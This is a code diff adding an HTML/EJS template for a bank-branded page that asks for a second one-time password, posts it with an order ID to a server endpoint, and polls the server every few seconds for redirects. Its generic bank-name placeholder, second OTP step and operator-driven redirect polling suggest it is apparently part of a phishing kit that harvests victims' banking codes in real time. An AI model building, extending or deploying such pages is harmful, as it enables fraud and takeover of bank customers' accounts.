@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= t.otp2.title %> - <%= t.bankName %></title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
+            padding: 20px;
+        }
+        .otp-container {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .otp-logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        .otp-subtitle {
+            font-size: 15px;
+            color: rgba(255,255,255,0.85);
+            margin-bottom: 30px;
+            line-height: 1.7;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            text-align: start;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 16px 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-family: 'Cairo', sans-serif;
+            background: #fff;
+            color: #333;
+            outline: none;
+            text-align: center;
+            letter-spacing: 8px;
+        }
+        .form-group input::placeholder {
+            color: #aaa;
+            letter-spacing: 2px;
+            font-size: 15px;
+        }
+        .submit-btn-wrap {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .otp-btn {
+            width: 100%;
+            max-width: 420px;
+            padding: 14px;
+            border: none;
+            border-radius: 30px;
+            background: #fff;
+            color: #5a3e2b;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+        }
+        .otp-btn:hover {
+            background: #f0ebe5;
+        }
+        .error-msg {
+            color: #ff3333;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .otp-hint {
+            color: rgba(255,255,255,0.7);
+            font-size: 13px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+        <img src="/images/logo-gold.png" alt="<%= t.bankName %>" class="otp-logo">
+        <p class="otp-subtitle"><%= t.otp2.subtitle %></p>
+
+        <div class="error-msg <% if (error) { %>show<% } %>" id="errorMsg"><%= t.otp2.error %></div>
+
+        <form id="otp2Form">
+            <div class="form-group">
+                <label for="otpCode"><%= t.otp2.label %></label>
+                <input type="tel" id="otpCode" name="otpCode" placeholder="<%= t.otp2.placeholder %>" maxlength="6" pattern="\d{4,6}" inputmode="numeric" required>
+            </div>
+        </form>
+        <p class="otp-hint"><%= t.otp2.hint %></p>
+    </div>
+
+    <div class="submit-btn-wrap">
+        <button type="submit" form="otp2Form" class="otp-btn"><%= t.otp2.submit %></button>
+    </div>
+
+    <script>
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var lang = params.get('lang') || 'ar';
+        var orderId = Number(params.get('orderId')) || 0;
+
+        if (orderId) {
+            setInterval(function() {
+                fetch('/api/requests/' + orderId + '/check')
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    if (d.redirect) {
+                        window.location.href = '/' + d.redirect + '?lang=' + lang + '&orderId=' + orderId;
+                    }
+                })
+                .catch(function(){});
+            }, 3000);
+        }
+
+        document.getElementById('otpCode').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        document.getElementById('otp2Form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var otp = document.getElementById('otpCode').value.trim();
+            if (!otp) return;
+
+            fetch('/api/submit-otp2', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ orderId: orderId, otp2: otp })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                if (d.ok) {
+                    window.location.href = '/loading?lang=' + lang + '&orderId=' + orderId + '&flow=otp2';
+                }
+            })
+            .catch(function(err) {
+                console.error(err);
+            });
+        });
+    })();
+    </script>
+    <%- include('partials/tracker') %>
+</body>
+</html>
